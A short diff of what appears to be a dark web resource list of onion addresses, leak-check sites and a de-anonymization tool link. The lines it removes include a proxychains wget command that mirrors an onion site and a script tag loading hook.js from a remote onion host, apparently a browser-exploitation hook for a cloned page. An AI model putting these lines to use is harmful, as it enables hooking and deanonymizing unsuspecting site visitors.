@@ -34,10 +34,6 @@ Onionmail: https://onionmail.org
 DarkForum: http://qeei4m7a2tve6ityewnezvcnf647onsqbmdbmlcw4y5pr6uwwfwa35yd.onion/
 Ramp: http://rampjcdlqvgkoz5oywutpo6ggl7g6tvddysustfl6qzhr5osr24xxqqd.onion
 Rutor: http://rutorbesth5lhmj47qz4fi5i4x5zvh4fizruog6iw2l3q223jmnawvid.onion
-Use the de-anon script BashBunny DW Deanon: https://github.com/bash-bunny/dw_deanon
-Test firefox with https://check.torproject.org
-Test DNS leaks with https://www.dnsleakstest.com
-Test ZAP with https://check.torproject.org
-And test DNS leaks with https://www.dnsleakstest.com
-1. Clone the onion domain: `proxychains4 -q wget -mkEpnp http://prjd5pmbug2cnfs67s3y65ods27vamswdaw2lnwf45ys3pjl55h2gwqd.onion/`
-<script src="http://fvo64npmo5prbtwmi3lrtuynsno6z34kdwdp6tvgyomrj3vo6kmsohad.onion:3000//hook.js"></script>
+BashBunny DW Deanon: https://github.com/bash-bunny/dw_deanon
+Check TOR: https://check.torproject.org
+Check DNS Leaks: https://www.dnsleakstest.com
